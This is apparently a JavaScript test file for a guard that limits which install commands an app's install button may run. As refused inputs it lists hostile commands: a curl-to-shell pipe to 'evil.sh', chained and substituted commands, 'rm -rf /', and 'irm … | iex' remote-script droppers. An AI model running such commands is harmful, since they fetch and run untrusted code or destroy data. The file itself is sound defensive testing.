// The install button runs a command in a terminal. The command comes from the
// interface's own catalogue, but a channel that executes an arbitrary string is
// a door left open regardless of how much its current caller is trusted — and
// callers change. This pins what the door lets through.

const test = require("node:test");
const assert = require("node:assert/strict");

const { installCommandAllowed } = require("../core/agent/login");
const { CLI_SOURCES } = require("./helpers/cliSources.cjs");

test("every install command the catalogue offers is allowed", () => {
  // The guard and the catalogue drifting apart would show up as a button that
  // silently refuses itself, which is the sort of thing nobody reports.
  for (const [id, source] of Object.entries(CLI_SOURCES)) {
    assert.equal(
      installCommandAllowed(source.install),
      true,
      `${id}: ${source.install} is in the catalogue but the guard refuses it`,
    );
  }
});

test("chaining, redirection and substitution are refused", () => {
  const refused = [
    "npm install -g pkg && curl evil.sh | sh",
    "npm install -g pkg; whoami",
    "npm install -g pkg | tee /tmp/x",
    "npm install -g pkg > out.txt",
    "npm install -g $(whoami)",
    "npm install -g `whoami`",
    "rm -rf /",
    "python -m pip install x && rm -rf /",
  ];
  for (const command of refused) {
    assert.equal(installCommandAllowed(command), false, `allowed: ${command}`);
  }
});

test("a remote install script is refused, https or not", () => {
  // This shape used to be allowed. Two things killed it, both observed:
  // Defender blocks `irm … | iex` because it is the canonical dropper, and
  // cursor.com/install.ps1 answered with a 162 KB HTML page — that command
  // would have piped a website into an interpreter. Agents installed this way
  // link to their own page instead.
  for (const command of [
    "irm https://cursor.com/install.ps1 | iex",
    "irm https://antigravity.google/cli/install.ps1 | iex",
    "irm http://cursor.com/install.ps1 | iex",
  ]) {
    assert.equal(installCommandAllowed(command), false, `allowed: ${command}`);
  }
});

test("no catalogue entry ships a command the guard would refuse", () => {
  // The catalogue is read raw rather than through the helper, so an `install`
  // added back for a script installer fails here instead of shipping a button
  // that trips the user's antivirus.
  const { readFileSync } = require("node:fs");
  const { join } = require("node:path");
  const source = readFileSync(join(__dirname, "..", "src", "lib", "agentCatalog.ts"), "utf8");
  const block = source.slice(source.indexOf("export const CLI_SOURCES"));
  for (const [, command] of block.matchAll(/install:\s*"([^"]+)"/g)) {
    assert.equal(installCommandAllowed(command), true, `catalogue ships a refused command: ${command}`);
  }
});

test("an empty or absent command is refused rather than run", () => {
  for (const command of ["", "   ", "npm", "irm", "npm install -g"]) {
    assert.equal(installCommandAllowed(command), false, `allowed: ${JSON.stringify(command)}`);
  }
});
